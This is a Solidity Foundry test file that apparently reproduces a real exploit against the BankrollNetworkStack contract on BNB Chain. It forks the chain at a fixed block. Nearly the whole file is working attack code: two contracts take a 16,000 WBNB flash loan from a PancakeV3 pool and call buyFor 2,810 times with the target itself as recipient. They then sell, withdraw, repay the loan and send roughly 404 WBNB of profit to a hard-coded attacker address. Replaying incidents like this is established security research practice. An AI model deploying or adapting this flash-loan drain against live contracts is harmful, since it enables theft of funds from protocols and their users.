
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 42481610;
    uint256 constant TX_TIMESTAMP = 1727023858;
    uint256 constant TX_BLOCK_NUMBER = 42481611;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        BankrollExploit attack = _deployExploit();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployExploit() internal returns (BankrollExploit attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackCode();
            attack = BankrollExploit(payable(ATTACK_CONTRACT));
        } else {
            attack = new BankrollExploit();
        }
        _etchChildCode();
        _bindChild(attack, Addresses.attack_child);
    }

    function _prepareProfit(BankrollExploit attack) internal {
        _prepareProfit(address(attack), _attackChildAddr(attack));
    }

    function _attackChildAddr(BankrollExploit attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _etchAttackCode() internal {
        vm.etch(ATTACK_CONTRACT, type(BankrollExploit).runtimeCode);
    }

    function _etchChildCode() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindChild(BankrollExploit attack, address attackChildAddress) internal {
        attack.bindAttackChild(attackChildAddress);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 404459593848661728154);
    }
}

contract BankrollExploit {
    AttackChild public attackChild;

    function attack() external payable {
        _executeExploit();
    }

    function _executeExploit() internal {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.BankrollNetworkStack);
        require(Addresses.attack_child.code.length != 0, "attack child runtime missing");
        AttackChild(payable(Addresses.attack_child)).execute();
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.attacker_eoa);
    }

    receive() external payable {}

    function arb(bytes calldata routeData) external payable {
        routeData;
        _executeExploit();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {}

    function execute() external payable {
        startFlashLoan();
        return;
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 feeAmount, bytes calldata callbackData) external payable {
        amount0;
        feeAmount;
        callbackData;
        flashCallback();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function flashLoan() external payable {
        flashCallback();
        return;
    }

    function _entryCb() internal {}

    function startFlashLoan() internal {
        bytes memory callbackData = hex"01";
        IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 0, 16000000000000000000000, callbackData);
        uint256 childWbnbProfit = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, childWbnbProfit);
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.attacker_eoa);
    }

    function flashCallback() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.BankrollNetworkStack, type(uint256).max);
        uint256 borrowedWbnb = IERC20Like(Addresses.WBNB).balanceOf(address(this));
        uint256 stackTokens =
            IBankrollNetworkStack(Addresses.BankrollNetworkStack).buyFor(address(this), borrowedWbnb);
        stackTokens;
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.BankrollNetworkStack);
        for (uint256 i = 0; i < 2810; i++) {
            IBankrollNetworkStack(Addresses.BankrollNetworkStack)
                .buyFor(Addresses.BankrollNetworkStack, 16413345861143662308303);
        }
        uint256 sellAmount = IBankrollNetworkStack(Addresses.BankrollNetworkStack).myTokens();
        IBankrollNetworkStack(Addresses.BankrollNetworkStack).sell(sellAmount);
        IBankrollNetworkStack(Addresses.BankrollNetworkStack).withdraw();
        uint256 repaymentAmount = 16008000000000000000000;
        IERC20Like(Addresses.WBNB).transfer(Addresses.PancakeV3Pool, repaymentAmount);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeV3Pool = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant attack_child = 0x40122cEcaAaD5dd1c1da4d8cEc42120565C547D7;
    address internal constant attacker_eoa = 0x4645863205b47a0A3344684489e8c446a437D66C;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant BankrollNetworkStack = 0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54;
    address internal constant attack_contract = 0x8f921E27e3AF106015D1C3a244eC4F48dBFcAD14;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
}

interface IBankrollNetworkStack {
    function buyFor(address, uint256) external returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(uint256) external;
    function withdraw() external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}
